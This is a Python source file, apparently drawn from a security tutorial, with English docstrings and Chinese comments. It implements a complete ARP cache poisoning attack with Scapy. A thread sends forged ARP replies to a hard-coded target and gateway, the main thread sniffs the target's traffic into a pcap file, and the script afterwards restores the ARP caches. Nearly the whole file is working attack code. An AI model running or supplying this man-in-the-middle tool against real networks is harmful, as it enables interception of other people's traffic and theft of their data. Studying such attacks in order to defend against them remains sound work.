#-*-coding:utf-8-*-
'''
we convince a target machine that we have become its gateway and we will also convince the gateway
that in order to reach the target machine,all traffic has to go through us.Every computer
on a network maintains an ARP cache that stores the most recent MAC address that match to IP
addresses on the local network, and we are going to poison this cache with entires that we control
to achieve this attack.
通过raw_socket 构造一个 arp 包，始终向目标机器的 arp cache 发送，一直将他淹没，此时发送到目标机器的所有数据包都会本主机
在传到目标机器上，这样就抓取了所有的数据包，然后将数据包保存成 pcap 的形式，通过 wireshark 或者 写脚本去分析
'''

'''
This is the main setup portion of out attack.We start by resolving the gateway and target IP
address's corresponding MAC addresses using a function called get_mac that we'll plumb in shrotly.
After we have accomplished that,we spin up a second thread to begin the actual ARP poisoning
attack.In our main thread,we start up a sniffer that will capture a preset amount of packets
using a BPF filter to only capture traffic for our target IP address.When all of the packets have
been captured,we write them our to a PCAP file so that we can open them in Wireshark or usr our
restore_target function,which is responsible for putting the network back to the way it was
before the ARP poisoning took place.Let's add the supporting functions now by punching in the
following code above our previous code block.

ipconfig
--Default Gateway      172.16.1.254
arp -a
  Internet Address     Physical Address      Type
-- 172.16.1.254        3c-ea-4f-2b-41-f9     dynamic

'''


from scapy.all import *
import os
import sys
import threading

interface    = "en1"
target_ip    = "172.16.1.71"
gateway_ip   = "172.16.1.254"
packet_count = 1000
poisoning    = True

'''
restore_target function simply sends out the appropriate ARP packets to the network broadcast address to reset the ARP caches of th
gateway and target machines.
'''
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    
    # slightly different method using send
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,  hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip,  pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac) ,count=5)
    
def get_mac(ip_address):        #输入IP地址，得到MAC地址
    
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    
    return None
    
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):     #打开一个线程，专门用于poison
    global poisoning
   
    poison_target = ARP()
    poison_target.op   = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op   = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while poisoning:                    #poisoning=True 所以这个线程中会一直投毒，一直维持向ARP缓存中发送错误的解析信息
        send(poison_target)
        send(poison_gateway)
          
        time.sleep(2)
          
    print "[*] ARP poison attack finished."

    return

# set our interface
conf.iface = interface

# turn off output
conf.verb  = 0

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)       #得到自身的MAC地址

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)         #得到目标的MAC地址

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip,target_mac)
    
# start poison thread   开始线程 
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

#开始抓取目标主机的数据包   
try:
    print "[*] Starting sniffer for %d packets" % packet_count
    
    bpf_filter  = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
except KeyboardInterrupt:
    pass

finally:
    # write out the captured packets
    print "[*] Writing packets to arper.pcap"
    wrpcap('arper.pcap',packets)            #开始将数据包写入 pcap, 

    poisoning = False                       #停止ARP poisoning,通过全局变量使另外一个线程停止运行

    # wait for poisoning thread to exit
    time.sleep(2)

    # restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)     #恢复目标 ip-mac 对应关系，包括本机和目标主机
    sys.exit(0)



